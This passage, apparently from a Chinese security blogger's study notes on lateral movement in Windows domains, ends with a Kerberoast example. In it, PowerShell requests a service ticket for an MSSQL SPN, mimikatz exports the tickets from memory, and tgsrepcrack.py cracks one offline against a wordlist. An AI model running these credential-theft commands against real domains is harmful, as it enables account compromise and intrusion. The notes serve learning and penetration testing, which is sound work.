+<h5 id="使用示例-破解mssql服务的票据："><a href="#使用示例-破解mssql服务的票据：" class="headerlink" title="使用示例-破解mssql服务的票据："></a>使用示例-破解mssql服务的票据：</h5><p>请求SPN Kerberos票据</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在powershell下输入以下命令。请求单个TGS</span></span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">"MSSQLSvc\computer1.pentest.com"</span></span><br></pre></td></tr></table></figure>
+
+<p>导出票据并破解</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 在mimikatz执行命令，将内存中的票据导出，导出的票据会保存在当前目录的kirbi文件中</span><br><span class="line"><span class="function">kerberos::<span class="title">list</span> /<span class="title">export</span></span></span><br><span class="line"><span class="function"># 使用<span class="title">Kerberosast</span>脚本离线破解票据对应帐号的<span class="title">NTLM</span> <span class="title">hash</span>。<span class="title">wordlist</span>是字典</span></span><br><span class="line"><span class="function"><span class="title">tgsrepcrack.py</span> <span class="title">wordlist.txt</span> <span class="title">test.kirbi</span></span></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、常用Windows远程连接（IPC-）和相关命令"><span class="toc-number">1.</span> <span class="toc-text">一、常用Windows远程连接（IPC$）和相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法："><span class="toc-number">1.1.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件："><span class="toc-number">1.2.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方法："><span class="toc-number">1.3.</span> <span class="toc-text">利用方法：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、Windows系统散列值获取"><span class="toc-number">2.</span> <span class="toc-text">二、Windows系统散列值获取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用条件：-1"><span class="toc-number">2.1.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用工具及方法："><span class="toc-number">2.2.</span> <span class="toc-text">利用工具及方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1、GetPass获取明文密码"><span class="toc-number">2.2.1.</span> <span class="toc-text">1、GetPass获取明文密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2、PwDump7"><span class="toc-number">2.2.2.</span> <span class="toc-text">2、PwDump7</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3、Mimikatz"><span class="toc-number">2.2.3.</span> <span class="toc-text">3、Mimikatz</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用mimikatz在线读取SAM文件"><span class="toc-number">2.3.</span> <span class="toc-text">使用mimikatz在线读取SAM文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用mimikatz离线读取lsass-dmp文件"><span class="toc-number">2.4.</span> <span class="toc-text">使用mimikatz离线读取lsass.dmp文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用Powershell进行hash-dump"><span class="toc-number">2.5.</span> <span class="toc-text">使用Powershell进行hash dump</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用MSF进行hash-dump"><span class="toc-number">2.6.</span> <span class="toc-text">使用MSF进行hash dump</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、哈希传递-Pass-the-Hash，PTH"><span class="toc-number">3.</span> <span class="toc-text">三、哈希传递(Pass-the-Hash，PTH)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用场景："><span class="toc-number">3.1.</span> <span class="toc-text">利用场景：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用NTLM-HASH进行哈希传递"><span class="toc-number">3.2.</span> <span class="toc-text">使用NTLM HASH进行哈希传递</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用ASE-256密钥进行哈希传递"><span class="toc-number">3.3.</span> <span class="toc-text">使用ASE-256密钥进行哈希传递</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、票据传递（Pass-the-Ticket，PTT）"><span class="toc-number">4.</span> <span class="toc-text">四、票据传递（Pass-the-Ticket，PTT）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#伪造黄金票据"><span class="toc-number">4.1.</span> <span class="toc-text">伪造黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#利用条件：-2"><span class="toc-number">4.1.1.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用方法：-1"><span class="toc-number">4.1.2.</span> <span class="toc-text">利用方法：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#伪造白银票据："><span class="toc-number">4.2.</span> <span class="toc-text">伪造白银票据：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#利用条件：-3"><span class="toc-number">4.2.1.</span> <span class="toc-text">利用条件：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#可利用的服务列表："><span class="toc-number">4.2.2.</span> <span class="toc-text">可利用的服务列表：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用方法：-2"><span class="toc-number">4.2.3.</span> <span class="toc-text">利用方法：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#五、PsExec"><span class="toc-number">5.</span> <span class="toc-text">五、PsExec</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用注意："><span class="toc-number">5.1.</span> <span class="toc-text">使用注意：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法：-1"><span class="toc-number">5.2.</span> <span class="toc-text">使用方法：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf的psexec模块"><span class="toc-number">5.3.</span> <span class="toc-text">msf的psexec模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#六、WMI"><span class="toc-number">6.</span> <span class="toc-text">六、WMI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法"><span class="toc-number">6.1.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#七、SMBexec"><span class="toc-number">7.</span> <span class="toc-text">七、SMBexec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#八、DCOM在远程系统中的使用"><span class="toc-number">8.</span> <span class="toc-text">八、DCOM在远程系统中的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#使用方法：-2"><span class="toc-number">8.1.</span> <span class="toc-text">使用方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#获取DCOM程序列表"><span class="toc-number">8.1.1.</span> <span class="toc-text">获取DCOM程序列表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用DCOM执行任意命令"><span class="toc-number">8.1.2.</span> <span class="toc-text">使用DCOM执行任意命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用DCOM在远程目标执行命令"><span class="toc-number">8.1.3.</span> <span class="toc-text">使用DCOM在远程目标执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#九、SPN在域环境中的应用"><span class="toc-number">9.</span> <span class="toc-text">九、SPN在域环境中的应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SPN扫描"><span class="toc-number">9.1.</span> <span class="toc-text">SPN扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SPN命令格式"><span class="toc-number">9.1.1.</span> <span class="toc-text">SPN命令格式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#常见SPN服务"><span class="toc-number">9.1.2.</span> <span class="toc-text">常见SPN服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用powershell进行SPN扫描"><span class="toc-number">9.1.3.</span> <span class="toc-text">使用powershell进行SPN扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用Windows自带工具列出SPN信息"><span class="toc-number">9.1.4.</span> <span class="toc-text">使用Windows自带工具列出SPN信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberoast攻击"><span class="toc-number">9.2.</span> <span class="toc-text">Kerberoast攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#使用示例-破解mssql服务的票据："><span class="toc-number">9.2.1.</span> <span class="toc-text">使用示例-破解mssql服务的票据：</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&text=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&is_video=false&description=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网安全学习笔记--Ⅴ：域内横向移动&body=Check out this article: http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&title=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&name=内网安全学习笔记--Ⅴ：域内横向移动&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/02/02/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E2%85%A4%EF%BC%9A%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/&t=内网安全学习笔记--Ⅴ：域内横向移动" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    R17a
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/download/">Download</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?05441306932d71b1dba39f817847ce3e";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
